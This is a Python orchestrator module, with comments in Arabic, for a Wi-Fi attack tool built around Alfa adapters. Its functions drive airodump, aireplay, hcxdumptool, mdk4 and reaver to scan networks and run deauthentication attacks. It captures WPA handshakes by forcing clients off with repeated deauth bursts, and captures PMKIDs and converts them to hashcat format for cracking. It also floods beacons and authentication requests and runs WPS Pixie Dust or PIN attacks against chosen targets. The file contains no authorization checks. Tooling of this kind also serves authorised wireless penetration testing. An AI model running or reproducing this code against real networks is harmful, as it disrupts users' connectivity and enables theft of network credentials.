# ============================================================
# Alfa Commander - Orchestrator
# المنسق الأعلى لكل العمليات
# ============================================================

from __future__ import annotations

import asyncio
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Optional

from app.constants import (
    AdapterState,
    AttackState,
    AttackType,
    EVIDENCE_DIR,
)
from app.core.adapters import (
    BaseAlfaAdapter,
    detect_adapters,
)
from app.core.channel_scheduler import (
    ChannelScheduler,
    HopStrategy,
    get_channel_manager,
    pin_channel,
    unpin_channel,
    start_hopping,
)
from app.core.injection_validator import (
    InjectionAssessment,
    get_injection_validator,
)
from app.core.process_manager import (
    ManagedProcess,
    ProcessKind,
    get_process_manager,
)
from app.core.tools import airodump, aireplay, hcxdumptool, mdk4, reaver
from app.state import (
    AttackInfo,
    NetworkInfo,
    get_state,
)
from app.utils.db import get_db
from app.utils.formatters import format_duration
from app.utils.oui_lookup import lookup as oui_lookup
from app.utils.shell import StreamingProcess
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# الأحداث
# ------------------------------------------------------------
class EventType:
    NETWORK_FOUND = "network_found"
    NETWORK_UPDATED = "network_updated"
    CLIENT_FOUND = "client_found"
    ADAPTER_READY = "adapter_ready"
    ADAPTER_FAILED = "adapter_failed"
    INJECTION_TESTED = "injection_tested"
    ATTACK_STARTED = "attack_started"
    ATTACK_PROGRESS = "attack_progress"
    ATTACK_FINISHED = "attack_finished"
    CAPTURE_SAVED = "capture_saved"
    CREDENTIAL_CAPTURED = "credential_captured"
    LOG_MESSAGE = "log_message"


EventHandler = Callable[[str, dict], None]


# ------------------------------------------------------------
# المنسق
# ------------------------------------------------------------
class Orchestrator:
    """
    نقطة الدخول الموحدة.
    الواجهة الرسومية لا تتحدث مع الأدوات مباشرة، بل عبر هذا الكلاس.
    """

    _instance: Optional["Orchestrator"] = None

    def __new__(cls) -> "Orchestrator":
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._init()
        return cls._instance

    def _init(self):
        self._lock = asyncio.Lock()
        self.state = get_state()
        self.pm = get_process_manager()
        self.validator = get_injection_validator()
        self.channel_mgr = get_channel_manager()

        # خريطة المحولات: adapter_id → BaseAlfaAdapter
        self.adapters: dict[str, BaseAlfaAdapter] = {}

        # خريطة العمليات: process_id → (kind, adapter_id, bssid)
        self.process_map: dict[str, dict] = {}

        # خريطة schedulers: adapter_id → ChannelScheduler
        self.schedulers: dict[str, ChannelScheduler] = {}

        # خريطة التقاط المصافحة: bssid → prefix
        self.capture_prefixes: dict[str, Path] = {}

        # المستمعون للأحداث
        self._handlers: dict[str, list[EventHandler]] = {}

    # ============================================================
    # نظام الأحداث
    # ============================================================
    def subscribe(self, event_type: str, handler: EventHandler):
        self._handlers.setdefault(event_type, []).append(handler)

    def unsubscribe(self, event_type: str, handler: EventHandler):
        if event_type in self._handlers:
            try:
                self._handlers[event_type].remove(handler)
            except ValueError:
                pass

    def _emit(self, event_type: str, data: Optional[dict] = None):
        data = data or {}
        for handler in self._handlers.get(event_type, []):
            try:
                handler(event_type, data)
            except Exception as e:
                logger.exception(f"خطأ في معالج الحدث {event_type}: {e}")

    # ============================================================
    # التهيئة
    # ============================================================
    async def initialize(self) -> dict:
        """
        تهيئة النظام: كشف المحولات، فحص الجاهزية، فحص الحقن.
        يعيد تقرير التهيئة.
        """
        logger.info("تهيئة المنسق...")

        report = {
            "adapters_found": 0,
            "adapters_ready": 0,
            "adapters_failed": 0,
            "details": [],
        }

        # 1) كشف المحولات
        detected = detect_adapters()
        report["adapters_found"] = len(detected)

        if not detected:
            logger.warning("لم يتم اكتشاف أي محول Alfa.")
            return report

        # 2) تسجيل كل محول في الحالة العامة
        for adapter in detected:
            # استخدم الواجهة كمعرّف أساسي (أكثر ثباتاً)
            adapter_id = adapter.interface
            self.adapters[adapter_id] = adapter
            if adapter.mac:
                self.adapters[adapter.mac] = adapter
            logger.info(f"تسجيل المحول: {adapter_id} -> {adapter.MODEL}")

            self.state.add_adapter(self._adapter_to_state(adapter, adapter_id))

            # 3) فحص الجاهزية
            try:
                readiness = adapter.check_readiness(test_injection=False)
                detail = {
                    "id": adapter_id,
                    "model": adapter.MODEL,
                    "interface": adapter.interface,
                    "ready": readiness.ready,
                    "warnings": readiness.warnings,
                    "errors": readiness.errors,
                }
                report["details"].append(detail)

                if readiness.ready:
                    report["adapters_ready"] += 1
                    self._emit(EventType.ADAPTER_READY, detail)
                else:
                    report["adapters_failed"] += 1
                    self._emit(EventType.ADAPTER_FAILED, detail)
            except Exception as e:
                logger.exception(f"فشل فحص {adapter.MODEL}: {e}")
                report["adapters_failed"] += 1

        return report

    def _adapter_to_state(self, adapter: BaseAlfaAdapter, adapter_id: str):
        from app.state import AdapterInfo
        return AdapterInfo(
            id=adapter_id,
            model=adapter.MODEL,
            chipset=adapter.CHIPSET,
            interface=adapter.interface,
            monitor_interface=adapter.monitor_interface,
            bands=adapter.DEFAULT_BANDS.copy(),
            driver=adapter.DEFAULT_DRIVER,
            driver_type=adapter.DRIVER_TYPE,
            max_standard=adapter.MAX_STANDARD,
            state=adapter.state,
            mac_address=adapter.mac,
            usb_id=adapter.usb_id,
            min_kernel=adapter.MIN_KERNEL,
            warnings=list(adapter.warnings),
        )

    # ============================================================
    # إدارة المحولات
    # ============================================================
    def get_adapter(self, adapter_id: str) -> Optional[BaseAlfaAdapter]:
        return self.adapters.get(adapter_id)

    def get_active_adapter(self) -> Optional[BaseAlfaAdapter]:
        active_id = self.state.active_adapter_id
        if active_id:
            return self.adapters.get(active_id)
        # إن لم يكن هناك محدد، نستخدم الأول
        return next(iter(self.adapters.values()), None)

    async def prepare_adapter(
        self,
        adapter_id: str,
        test_injection: bool = True,
    ) -> InjectionAssessment | None:
        """
        تجهيز محول للاختبارات: تفعيل المراقبة + اختبار الحقن.
        """
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        logger.info(f"تجهيز {adapter.MODEL} ({adapter.interface})...")

        # 1) تفعيل المراقبة (إن لم تكن مفعلة)
        if not adapter.is_monitor():
            loop = asyncio.get_event_loop()
            success = await loop.run_in_executor(
                None, adapter.enter_monitor_mode
            )
            if not success:
                raise RuntimeError(
                    f"فشل تفعيل وضع المراقبة على {adapter.MODEL}"
                )

        # 2) تحديث الحالة
        state_adapter = self.state.get_adapter(adapter_id)
        if state_adapter:
            state_adapter.state = AdapterState.MONITOR
            state_adapter.monitor_interface = adapter.monitor_interface

        # 3) اختبار الحقن
        if test_injection:
            assessment = await self.validator.test(adapter, force=True)
            self._emit(EventType.INJECTION_TESTED, {
                "adapter_id": adapter_id,
                "ratio": assessment.ratio,
                "quality": assessment.quality,
                "warnings": assessment.warnings,
            })
            return assessment

        return None

    def refresh_adapters(self) -> int:
        """يعيد اكتشاف المحولات ويسجلها. يعيد العدد."""
        from app.core.adapters import detect_adapters

        detected = detect_adapters()

        # امسح القديم
        self.adapters.clear()

        for adapter in detected:
            adapter_id = adapter.interface
            self.adapters[adapter_id] = adapter
            logger.info(f"تسجيل: {adapter_id} -> {adapter.MODEL}")

        return len(detected)

    async def release_adapter(self, adapter_id: str):
        """إعادة المحول إلى وضع managed."""
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            return

        # إيقاف كل عمليات هذا المحول
        await self.pm.stop_by_adapter(adapter_id)

        # إيقاف المجدول
        if adapter_id in self.schedulers:
            await self.schedulers[adapter_id].stop()
            del self.schedulers[adapter_id]

        # إعادة الوضع
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, adapter.exit_monitor_mode)

        state_adapter = self.state.get_adapter(adapter_id)
        if state_adapter:
            state_adapter.state = AdapterState.MANAGED
            state_adapter.monitor_interface = None

        logger.info(f"تم تحرير {adapter.MODEL}")

    # ============================================================
    # المسح
    # ============================================================
    async def start_scan(
        self,
        adapter_id: str,
        channels: Optional[list[int]] = None,
        dwell: float = 0.3,
        ignore_negative_one: bool = True,
    ) -> str:
        """
        بدء مسح مستمر مع بث النتائج.
        يعيد معرف العملية.
        """
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        # إيقاف أي مسح سابق
        await self.pm.stop_by_kind(ProcessKind.SCAN)

        # إنشاء scheduler للقفز
        if channels is None:
            channels = HopStrategy.for_adapter(adapter)

        scheduler = await start_hopping(
            adapter.get_active_interface(),
            channels,
            dwell,
        )
        self.schedulers[adapter_id] = scheduler

        # إعداد airodump
        scan_prefix = EVIDENCE_DIR / f"scan_{adapter_id}_{int(datetime.now().timestamp())}"

        opts = airodump.AirodumpOptions(
            interface=adapter.get_active_interface(),
            output_prefix=scan_prefix,
            band="bg",
            ignore_negative_one=ignore_negative_one,
            write_interval=1,
        )

        # bث النتائج
        def on_network(net: airodump.ScannedNetwork):
            self._handle_scanned_network(net)

        def on_client(cli: airodump.ScannedClient):
            self._handle_scanned_client(cli)

        process = await airodump.Airodump.scan_streaming(
            opts,
            on_network=on_network,
            on_client=on_client,
        )

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.SCAN,
            adapter_id=adapter_id,
            metadata={"prefix": str(scan_prefix)},
        )

        self.process_map[proc_id] = {
            "kind": ProcessKind.SCAN,
            "adapter_id": adapter_id,
            "prefix": str(scan_prefix),
        }

        self.state.scanning = True
        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": "scan",
            "adapter_id": adapter_id,
        })

        logger.info(f"بدأ المسح [{proc_id}] على {adapter.interface}")
        return proc_id

    async def stop_scan(self):
        """إيقاف كل عمليات المسح."""
        procs = self.pm.list_by_kind(ProcessKind.SCAN)
        for p in procs:
            await self.pm.stop(p.id)
        self.state.scanning = False

        # إيقاف كل المجدولات
        for scheduler in self.schedulers.values():
            await scheduler.stop()
        self.schedulers.clear()

    def _handle_scanned_network(self, net: airodump.ScannedNetwork):
        """معالجة شبكة مكتشفة."""
        vendor = oui_lookup(net.bssid)
        network = NetworkInfo(
            bssid=net.bssid,
            essid=net.essid,
            channel=net.channel,
            band=_band_from_channel(net.channel),
            encryption=net.encryption_type,
            cipher=net.cipher,
            auth=net.auth,
            power=net.power,
            beacons=net.beacons,
            data_frames=net.data_frames,
            hidden=net.hidden,
            vendor=vendor,
        )
        self.state.upsert_network(network)
        self._emit(EventType.NETWORK_FOUND, {
            "bssid": net.bssid,
            "essid": net.essid,
            "channel": net.channel,
            "power": net.power,
            "encryption": net.encryption_type,
            "vendor": vendor,
        })

    def _handle_scanned_client(self, cli: airodump.ScannedClient):
        """معالجة عميل مكتشف."""
        vendor = oui_lookup(cli.mac)
        self._emit(EventType.CLIENT_FOUND, {
            "mac": cli.mac,
            "station": cli.station,
            "power": cli.power,
            "vendor": vendor,
        })

        if cli.station:
            net = self.state.get_network(cli.station)
            if net and cli.mac not in net.clients:
                net.clients.append(cli.mac)

    # ============================================================
    # هجوم Deauth
    # ============================================================
    async def deauth(
        self,
        adapter_id: str,
        bssid: str,
        client: Optional[str] = None,
        count: Optional[int] = None,
        interval: Optional[int] = None,
    ) -> str:
        """
        تنفيذ هجوم Deauth مع تكييف تلقائي بناءً على نسبة الحقن.
        """
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        # فحص الحقن
        assessment = await self.validator.test(adapter)

        if not assessment.is_usable():
            raise RuntimeError(
                f"الحقن ضعيف جداً ({assessment.ratio}%)، "
                "لا يمكن تنفيذ Deauth. "
                f"التوصية: {assessment.recommended_attack}"
            )

        # تكييف العدد والفاصل
        if count is None:
            count = assessment.recommended_deauth_count
        if interval is None:
            interval = assessment.recommended_deauth_interval

        # تثبيت القناة
        target_net = self.state.get_network(bssid)
        if target_net:
            await pin_channel(adapter.get_active_interface(), target_net.channel)

        # بناء الأمر
        opts = aireplay.DeauthOptions(
            interface=adapter.get_active_interface(),
            bssid=normalize_mac(bssid),
            client=normalize_mac(client) if client else None,
            count=count,
            interval=interval,
            ignore_negative_one=True,
        )

        process = await aireplay.Aireplay.deauth_streaming(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.DEAUTH,
            adapter_id=adapter_id,
            target_bssid=bssid,
        )

        self.process_map[proc_id] = {
            "kind": ProcessKind.DEAUTH,
            "adapter_id": adapter_id,
            "target_bssid": bssid,
        }

        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.DEAUTH,
            "target_bssid": bssid,
            "client": client,
            "count": count,
            "interval": interval,
            "injection_ratio": assessment.ratio,
        })

        logger.info(
            f"بدء Deauth [{proc_id}] على {bssid} "
            f"(count={count}, interval={interval}, ratio={assessment.ratio}%)"
        )

        return proc_id

    # ============================================================
    # التقاط Handshake
    # ============================================================
    async def capture_handshake(
        self,
        adapter_id: str,
        bssid: str,
        channel: int,
        duration: int = 120,
    ) -> str:
        """
        التقاط مصافحة WPA/WPA2 على هدف محدد.
        يبدأ airodump على القناة، ثم Deauth تلقائي لإجبار العميل على إعادة الاتصال.
        """
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        # نجهز المحول
        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        # تثبيت القناة
        await pin_channel(adapter.get_active_interface(), channel)

        # إعداد مسار الحفظ
        safe_bssid = bssid.replace(":", "")
        cap_prefix = EVIDENCE_DIR / f"hs_{safe_bssid}_{int(datetime.now().timestamp())}"
        self.capture_prefixes[bssid] = cap_prefix

        opts = airodump.AirodumpOptions(
            interface=adapter.get_active_interface(),
            output_prefix=cap_prefix,
            channel=channel,
            bssid=normalize_mac(bssid),
            ignore_negative_one=True,
        )

        process = await airodump.Airodump.scan_streaming(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.HANDSHAKE,
            adapter_id=adapter_id,
            target_bssid=bssid,
        )

        self.process_map[proc_id] = {
            "kind": ProcessKind.HANDSHAKE,
            "adapter_id": adapter_id,
            "target_bssid": bssid,
            "prefix": str(cap_prefix),
            "channel": channel,
        }

        # نبث الأحداث
        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.HANDSHAKE,
            "target_bssid": bssid,
            "channel": channel,
            "prefix": str(cap_prefix),
        })

        # بعد ثانيتين، نبدأ Deauth تلقائياً
        asyncio.create_task(self._auto_deauth_for_handshake(adapter_id, bssid, duration))

        logger.info(f"بدء التقاط Handshake [{proc_id}] على {bssid} (CH {channel})")
        return proc_id

    async def _auto_deauth_for_handshake(
        self,
        adapter_id: str,
        bssid: str,
        duration: int,
    ):
        """
        Deauth تلقائي كل 30 ثانية حتى التقاط المصافحة أو انتهاء المدة.
        """
        await asyncio.sleep(2)
        end_time = datetime.now().timestamp() + duration

        while datetime.now().timestamp() < end_time:
            try:
                # فحص وجود ملف مصافحة
                if self._has_handshake(bssid):
                    logger.info(f"تم التقاط المصافحة على {bssid}")
                    self._emit(EventType.CAPTURE_SAVED, {
                        "type": "handshake",
                        "bssid": bssid,
                        "file": str(self.capture_prefixes.get(bssid, "")),
                    })
                    # إيقاف كل العمليات على هذا الهدف
                    await self.pm.stop_by_target(bssid)
                    return

                # إرسال دفعة Deauth
                await self.deauth(adapter_id, bssid, count=5, interval=1)
                await asyncio.sleep(2)
                # إيقاف Deauth بعد دفعة قصيرة
                await self.pm.stop_by_kind(ProcessKind.DEAUTH)

                await asyncio.sleep(25)
            except Exception as e:
                logger.exception(f"خطأ في Deauth التلقائي: {e}")
                await asyncio.sleep(10)

    def _has_handshake(self, bssid: str) -> bool:
        """فحص وجود ملف مصافحة صالح."""
        prefix = self.capture_prefixes.get(bssid)
        if not prefix:
            return False

        cap_file = Path(str(prefix) + "-01.cap")
        if not cap_file.exists():
            return False

        # استخدام aircrack-ng للتحقق من وجود مصافحة
        from app.utils.shell import run
        result = run(["aircrack-ng", str(cap_file)], timeout=10)
        return "1 handshake" in result.stdout.lower()

    # ============================================================
    # التقاط PMKID
    # ============================================================
    async def capture_pmkid(
        self,
        adapter_id: str,
        bssid: str,
        duration: int = 120,
    ) -> str:
        """
        التقاط PMKID باستخدام hcxdumptool.
        """
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        safe_bssid = bssid.replace(":", "")
        pcapng_file = EVIDENCE_DIR / f"pmkid_{safe_bssid}_{int(datetime.now().timestamp())}.pcapng"

        opts = hcxdumptool.HCXDumpOptions(
            interface=adapter.get_active_interface(),
            output_file=pcapng_file,
            bssid_filter=[normalize_mac(bssid)],
            duration=duration,
        )

        process = await hcxdumptool.HCXDumptool.capture(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.PMKID,
            adapter_id=adapter_id,
            target_bssid=bssid,
        )

        self.process_map[proc_id] = {
            "kind": ProcessKind.PMKID,
            "adapter_id": adapter_id,
            "target_bssid": bssid,
            "file": str(pcapng_file),
        }

        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.PMKID,
            "target_bssid": bssid,
            "file": str(pcapng_file),
        })

        # مهام ما بعد الانتهاء
        asyncio.create_task(
            self._process_pmkid_after(proc_id, bssid, pcapng_file, duration)
        )

        logger.info(f"بدء التقاط PMKID [{proc_id}] على {bssid}")
        return proc_id

    async def _process_pmkid_after(
        self,
        proc_id: str,
        bssid: str,
        pcapng_file: Path,
        duration: int,
    ):
        """بعد انتهاء hcxdumptool، نحلل النتائج."""
        await asyncio.sleep(duration + 3)

        try:
            result = hcxdumptool.HCXDumptool.parse_capture_results(pcapng_file)

            if result.success:
                # تحويل إلى hashcat 22000
                hc_file = pcapng_file.with_suffix(".22000")
                hcxdumptool.HCXDumptool.convert_to_hashcat(pcapng_file, hc_file)

                self.state.increment_stat("pmkids_captured")
                self._emit(EventType.CAPTURE_SAVED, {
                    "type": "pmkid",
                    "bssid": bssid,
                    "file": str(pcapng_file),
                    "hashcat_file": str(hc_file),
                    "pmkid_count": result.pmkid_count,
                    "eapol_count": result.eapol_count,
                })

                # حفظ في قاعدة البيانات
                try:
                    db = await get_db()
                    await db.save_capture(
                        bssid=bssid,
                        cap_type="pmkid",
                        file_path=str(pcapng_file),
                        hashcat_path=str(hc_file),
                        metadata={
                            "pmkid_count": result.pmkid_count,
                            "eapol_count": result.eapol_count,
                        },
                    )
                except Exception as e:
                    logger.exception(f"فشل حفظ PMKID في قاعدة البيانات: {e}")
            else:
                logger.warning(f"لم يتم التقاط PMKID على {bssid}")
                self._emit(EventType.ATTACK_FINISHED, {
                    "process_id": proc_id,
                    "success": False,
                    "bssid": bssid,
                })
        except Exception as e:
            logger.exception(f"خطأ في معالجة PMKID: {e}")

    # ============================================================
    # هجمات mdk4
    # ============================================================
    async def beacon_flood(
        self,
        adapter_id: str,
        channel: Optional[int] = None,
        ssid_random: bool = True,
        wpa: bool = True,
    ) -> str:
        """Beacon Flood عبر mdk4."""
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        if channel:
            await pin_channel(adapter.get_active_interface(), channel)

        opts = mdk4.BeaconFloodOptions(
            interface=adapter.get_active_interface(),
            channel=channel,
            ssid_random=ssid_random,
            wpa=wpa,
        )

        process = mdk4.MDK4.beacon_flood(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.BEACON_FLOOD,
            adapter_id=adapter_id,
        )

        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.BEACON_FLOOD,
            "channel": channel,
        })

        return proc_id

    async def auth_flood(self, adapter_id: str, bssid: str) -> str:
        """Auth Flood عبر mdk4."""
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        net = self.state.get_network(bssid)
        if net:
            await pin_channel(adapter.get_active_interface(), net.channel)

        opts = mdk4.AuthFloodOptions(
            interface=adapter.get_active_interface(),
            bssid=normalize_mac(bssid),
        )

        process = mdk4.MDK4.auth_flood(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.AUTH_FLOOD,
            adapter_id=adapter_id,
            target_bssid=bssid,
        )

        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.AUTH_FLOOD,
            "target_bssid": bssid,
        })

        return proc_id

    # ============================================================
    # هجمات WPS
    # ============================================================
    async def wps_attack(
        self,
        adapter_id: str,
        bssid: str,
        channel: int,
        pixie_dust: bool = True,
        pin: Optional[str] = None,
    ) -> str:
        """هجوم WPS (Pixie Dust أو PIN)."""
        adapter = self.get_adapter(adapter_id)
        if not adapter:
            raise ValueError(f"محول غير معروف: {adapter_id}")

        if not adapter.is_monitor():
            await self.prepare_adapter(adapter_id, test_injection=False)

        await pin_channel(adapter.get_active_interface(), channel)

        opts = reaver.ReaverOptions(
            interface=adapter.get_active_interface(),
            bssid=normalize_mac(bssid),
            channel=channel,
            pixie_dust=pixie_dust,
            pin=pin,
        )

        process = await reaver.Reaver.attack(opts)

        proc_id = await self.pm.start(
            process,
            kind=ProcessKind.WPS,
            adapter_id=adapter_id,
            target_bssid=bssid,
        )

        self._emit(EventType.ATTACK_STARTED, {
            "process_id": proc_id,
            "type": AttackType.WPS_PIXIE if pixie_dust else AttackType.WPS_PIN,
            "target_bssid": bssid,
        })

        return proc_id

    # ============================================================
    # إيقاف كل شيء
    # ============================================================
    async def shutdown(self):
        """إيقاف كل العمليات وتحرير كل الموارد."""
        logger.info("إيقاف المنسق...")

        # إيقاف كل العمليات
        await self.pm.stop_all()

        # إيقاف كل المجدولات
        await self.channel_mgr.stop_all()

        # تحرير كل المحولات
        for adapter_id in list(self.adapters.keys()):
            try:
                await self.release_adapter(adapter_id)
            except Exception as e:
                logger.exception(f"فشل تحرير {adapter_id}: {e}")

        self.adapters.clear()
        self.process_map.clear()
        self.schedulers.clear()

        logger.info("تم إيقاف المنسق.")


# ------------------------------------------------------------
# أدوات مساعدة
# ------------------------------------------------------------
def _band_from_channel(channel: int) -> str:
    from app.constants import BAND_2GHZ_CHANNELS, BAND_5GHZ_CHANNELS, BAND_6GHZ_CHANNELS
    if channel in BAND_2GHZ_CHANNELS:
        return "2.4"
    if channel in BAND_5GHZ_CHANNELS:
        return "5"
    if channel in BAND_6GHZ_CHANNELS:
        return "6"
    return "?"


# ------------------------------------------------------------
# الوصول العالمي
# ------------------------------------------------------------
_orchestrator: Optional[Orchestrator] = None


def get_orchestrator() -> Orchestrator:
    global _orchestrator
    if _orchestrator is None:
        _orchestrator = Orchestrator()
    return _orchestrator
